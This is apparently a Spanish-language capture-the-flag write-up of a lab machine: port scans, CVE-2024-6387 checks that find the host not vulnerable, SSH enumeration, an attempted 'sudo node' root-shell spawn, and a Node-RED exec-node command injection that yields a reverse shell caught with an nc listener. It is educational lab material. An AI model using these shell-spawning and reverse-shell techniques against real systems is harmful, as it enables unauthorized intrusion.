# Auditoría de Seguridad

## Reconocimiento

```bash
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
1880/tcp open  vsat-control
3030/tcp open  arepa-cas
4040/tcp open  yo-main
```

```bash
Host is up (0.032s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
1880/tcp open  http    Node.js Express framework
|_http-cors: GET POST PUT DELETE
|_http-title: Node-RED
3030/tcp open  http    Node.js (Express middleware)
|_http-title: SIEM Taskboard
4040/tcp open  http    Node.js (Express middleware)
|_http-title: Net Defender \xE2\x80\x94 Sim
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
---


RegreSSHion (CVE-2024-6387): Note that while this is a major OpenSSH vulnerability, Debian 11 Bullseye was officially confirmed not affected as this specific regression was introduced in OpenSSH 8.5p1
```bash
┌──(kali㉿kali)-[~/CVE-2024-6387]
└─$ python3 CVE-2024-6387.py scan -T 10.130.152.121 -p 22
                                                     
   .aMMMb  dMMMMb  dMMMMMP dMMMMb  .dMMMb  .dMMMb  dMP dMP                                             
  dMP"dMP dMP.dMP dMP     dMP dMP dMP" VP dMP" VP dMP dMP                                              
 dMP dMP dMMMMP" dMMMP   dMP dMP  VMMMb   VMMMb  dMMMMMP                                               
dMP.aMP dMP     dMP     dMP dMP dP .dMP dP .dMP dMP dMP                                                
VMMMP" dMP     dMMMMMP dMP dMP  VMMMP"  VMMMP" dMP dMP                                                 
                                                                                                       
   ReggreSSHion CVE-2024-6387 Vulnerability Checker / Exploiter                                        
   2.0 - Optimized by @Kz                                                                              

🚨Servers likely vulnerable: 0
🛡️ Servers not vulnerable: 1
   [+] Server at 10.130.152.121 (N/A):22 (running SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1)
🛡️ Servers likely not vulnerable (possible LoginGraceTime remediation): 0
⚠️ Servers with unknown SSH version: 0
Summary:
📊 Total scanned hosts: 1
🚨 Total vulnerable hosts: 0
🛡️  Total not vulnerable hosts: 1
🛡️  Total likely not vulnerable hosts: 0
⚠️  Total unknown hosts: 0
🔒 Servers with port 22 closed: 0
```
```bash
┌──(kali㉿kali)-[~/CVE-2024-6387-Vulnerability-Checker]
└─$ python3 CVE-2024-6387-Vulnerability-Checker.py 10.130.152.121


  +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++                                        
  + CVE-2024-6387 Vulnerability Checker                       +                                        
  + Created by senhasegura Identity Threat Labs               +                                        
  + Filipi Pires - Threat Researcher & Cybersecurity Advocate +                                        
  + @senhasegura / @filipipires                               +                                        
  +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++                                        
                                                                                                       


SERVER NOT VULNERABLE: 1
[SAFE] -> 10.130.152.121:22-> Running SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1

```



```bash
en http://10.128.175.117:3030/api/tasks

```

```bash
└─$ ssh dfinkelstein@10.128.143.249                                   
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
dfinkelstein@10.128.143.249's password: 
Linux tnightmarebc 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64
Last login: Fri Oct 31 17:20:09 2025 from 172.16.162.1
dfinkelstein@tnightmarebc:~$ ls
help.txt
dfinkelstein@tnightmarebc:~$ cat help.txt
Contenido seguro para dfinkelstein
Si controlas Node Red controlas el mundo.

[*] Utiliza el servicio para seguir adelante: start|stop|restart|status

- Activar Servicio: sudo /usr/local/bin/nodered-toggle start
- Parar Servicio: sudo /usr/local/bin/nodered-toggle stop
dfinkelstein@tnightmarebc:~$ sudo /usr/local/bin/nodered-toggle start
✅ Node-RED activo
dfinkelstein@tnightmarebc:~$ ls
help.txt
dfinkelstein@tnightmarebc:~$ sudo su
[sudo] password for dfinkelstein: 
Sorry, user dfinkelstein is not allowed to execute '/usr/bin/su' as root on tnightmarebc.
dfinkelstein@tnightmarebc:~$ ls -la
total 20
drwx------ 3 dfinkelstein dfinkelstein 4096 oct 31  2025 .
drwxr-xr-x 5 root         root         4096 oct 31  2025 ..
lrwxrwxrwx 1 dfinkelstein dfinkelstein    9 oct 31  2025 .bash_history -> /dev/null
-rw-r--r-- 1 dfinkelstein dfinkelstein   87 oct 31  2025 .bashrc
-rw------- 1 dfinkelstein dfinkelstein  270 oct 31  2025 help.txt
drwxr-xr-x 3 dfinkelstein dfinkelstein 4096 oct 31  2025 .local
dfinkelstein@tnightmarebc:~$ cd /dev/null
-bash: cd: /dev/null: No es un directorio
dfinkelstein@tnightmarebc:~$ whoami
dfinkelstein
dfinkelstein@tnightmarebc:~$ ls
help.txt
dfinkelstein@tnightmarebc:~$ sudo node -e 'require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'
[sudo] password for dfinkelstein: 
Sorry, try again.
[sudo] password for dfinkelstein: 
Sorry, try again.
[sudo] password for dfinkelstein: 
sudo: 3 incorrect password attempts
dfinkelstein@tnightmarebc:~$ 
dfinkelstein@tnightmarebc:~$ sudo node -e 'require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'
[sudo] password for dfinkelstein: 
Sorry, user dfinkelstein is not allowed to execute '/usr/bin/node -e require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})' as root on tnightmarebc.
dfinkelstein@tnightmarebc:~$ ^C
dfinkelstein@tnightmarebc:~$ cd .local
dfinkelstein@tnightmarebc:~/.local$ ls
share
dfinkelstein@tnightmarebc:~/.local$ cat share
cat: share: Es un directorio
dfinkelstein@tnightmarebc:~/.local$ ..
-bash: ..: orden no encontrada
dfinkelstein@tnightmarebc:~/.local$ .
-bash: .: argumento de nombre de fichero requerido
.: modo de empleo: . fichero [argumentos]
dfinkelstein@tnightmarebc:~/.local$ cd ..
dfinkelstein@tnightmarebc:~$ cd .bash_history
-bash: cd: .bash_history: No es un directorio
dfinkelstein@tnightmarebc:~$ cd .bashrc
-bash: cd: .bashrc: No es un directorio
dfinkelstein@tnightmarebc:~$ ls -la .local
total 12
drwxr-xr-x 3 dfinkelstein dfinkelstein 4096 oct 31  2025 .
drwx------ 3 dfinkelstein dfinkelstein 4096 oct 31  2025 ..
drwx------ 3 dfinkelstein dfinkelstein 4096 oct 31  2025 share
dfinkelstein@tnightmarebc:~$ cd .local/.config
-bash: cd: .local/.config: No existe el fichero o el directorio
dfinkelstein@tnightmarebc:~$ cat help.txt
Contenido seguro para dfinkelstein
Si controlas Node Red controlas el mundo.

[*] Utiliza el servicio para seguir adelante: start|stop|restart|status

- Activar Servicio: sudo /usr/local/bin/nodered-toggle start
- Parar Servicio: sudo /usr/local/bin/nodered-toggle stop
dfinkelstein@tnightmarebc:~$ sudo /usr/local/bin/nodered-toggle status
● node-red.service - Node-RED controlled service
     Loaded: loaded (/etc/systemd/system/node-red.service; disabled; vendor preset: enabled)
     Active: activating (auto-restart) (Result: exit-code) since Tue 2026-06-16 18:03:59 CEST; 1s ago
    Process: 3951 ExecStart=/usr/bin/node-red --userDir /home/nightmare/.node-red --port 1880 (code=exited, status=1/FAILURE)                                                                                       
   Main PID: 3951 (code=exited, status=1/FAILURE)
        CPU: 1.341s

jun 16 18:03:59 tnightmarebc systemd[1]: node-red.service: Consumed 1.341s CPU time.
dfinkelstein@tnightmarebc:~$ 
dfinkelstein@tnightmarebc:~$ sudo -l
Matching Defaults entries for dfinkelstein on tnightmarebc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dfinkelstein may run the following commands on tnightmarebc:
    (root) NOPASSWD: /usr/local/bin/nodered-toggle, /usr/local/bin/nodered-toggle *
dfinkelstein@tnightmarebc:~$ 
```

## Explotación
```bash
┌──(kali㉿kali)-[~]
└─$ ssh dfinkelstein@10.128.154.75
The authenticity of host '10.128.154.75 (10.128.154.75)' can't be established.
ED25519 key fingerprint is: SHA256:3dqq7f/jDEeGxYQnF2zHbpzEtjjY49/5PvV5/4MMqns
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:12: [hashed name]
    ~/.ssh/known_hosts:13: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.128.154.75' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
dfinkelstein@10.128.154.75's password: 
Linux tnightmarebc 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64
Last login: Fri Oct 31 17:20:09 2025 from 172.16.162.1
dfinkelstein@tnightmarebc:~$ ls -la
total 20
drwx------ 3 dfinkelstein dfinkelstein 4096 oct 31  2025 .
drwxr-xr-x 5 root         root         4096 oct 31  2025 ..
lrwxrwxrwx 1 dfinkelstein dfinkelstein    9 oct 31  2025 .bash_history -> /dev/null
-rw-r--r-- 1 dfinkelstein dfinkelstein   87 oct 31  2025 .bashrc
-rw------- 1 dfinkelstein dfinkelstein  270 oct 31  2025 help.txt
drwxr-xr-x 3 dfinkelstein dfinkelstein 4096 oct 31  2025 .local

```

```bash
dfinkelstein@tnightmarebc:~$ cat help.txt
Contenido seguro para dfinkelstein
Si controlas Node Red controlas el mundo.

[*] Utiliza el servicio para seguir adelante: start|stop|restart|status

- Activar Servicio: sudo /usr/local/bin/nodered-toggle start
- Parar Servicio: sudo /usr/local/bin/nodered-toggle stop
dfinkelstein@tnightmarebc:~$ 

```

```bash
root:x:0:0:root:/root:/bin/bash
dev:x:1000:1000:dev,,,:/home/dev:/bin/bash
nightmare:x:1001:1001:,,,:/home/nightmare:/bin/bash
dfinkelstein:x:1002:1002:,,,:/home/dfinkelstein:/bin/bash

```

```bash
```

```bash
```

```bash
```


## Escalada de privilegios
Gracias a NODE-RED, el comando que se puede ver en la impagen, funciona cuando se inyecta porque el sistema ejecuta el input del usuario directamente en el sistema operativo mediante nodos como exec, sin una validación o sanitización adecuada, lo que permite que el string sea interpretado por Bash y se establezca la conexión inversa hacia el atacante.

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.128.160] from (UNKNOWN) [10.128.154.75] 46936
bash: no se puede establecer el grupo de proceso de terminal (337): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
dev@tnightmarebc:~$ ls -la
```

![](Evidencias_Visuales/inyección_NODE-RED)

## Flags encontradas
```bash
dev@tnightmarebc:~$ ls -la                                          
ls -la
total 44
drwx------ 5 dev  dev  4096 oct 31  2025 .
drwxr-xr-x 5 root root 4096 oct 31  2025 ..
lrwxrwxrwx 1 root root    9 abr 23  2023 .bash_history -> /dev/null
-rw------- 1 dev  dev   220 ene 15  2023 .bash_logout
-rw------- 1 dev  dev  3520 oct 31  2025 .bashrc
-rw-r--r-- 1 root root    3 oct 31  2025 flows*.json
drwxr-xr-x 3 dev  dev  4096 may 16  2023 .local
drwxr-xr-x 4 dev  dev  4096 jun 17 12:56 .node-red
drwxr-xr-x 3 dev  dev  4096 may 16  2023 .npm
-rw------- 1 dev  dev   807 ene 15  2023 .profile
-rw-r--r-- 1 dev  dev    66 may 16  2023 .selected_editor
-r-------- 1 dev  dev    66 abr  1  2025 user.txt
dev@tnightmarebc:~$ cat user.txt
cat user.txt
27 3b 2d 2d 68 61 76 65 20 69 20 62 65 65 6e 20 70 77 6e 65 64 3f
dev@tnightmarebc:~$ echo "27 3b 2d 2d 68 61 76 65 20 69 20 62 65 65 6e 20 70 77 6e 65 64 3f" | xxd -r -p
<69 20 62 65 65 6e 20 70 77 6e 65 64 3f" | xxd -r -p
';--have i been pwned?dev@tnightmarebc:~$ ^C
```

